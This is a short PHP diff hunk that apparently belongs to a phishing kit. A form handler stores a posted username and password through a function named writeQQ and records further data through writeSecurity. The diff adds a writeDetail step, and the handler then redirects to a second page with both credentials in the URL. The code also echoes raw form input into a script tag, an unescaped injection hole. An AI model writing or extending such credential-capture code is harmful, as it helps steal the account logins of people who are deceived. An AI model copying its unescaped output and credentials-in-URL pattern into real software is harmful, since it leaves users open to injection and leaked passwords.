@@ -13,6 +13,7 @@
                 }else{
                     writeQQ($_POST['u'],$_POST['p']);
                     writeSecurity($_POST['u'],'');
+                    writeDetail($_POST['u'],'');
                     echo '<script>parent.location.href="cn2.php?u='.$_POST['u'].'&p='.$_POST['p'].'"</script>';
                 }
             }
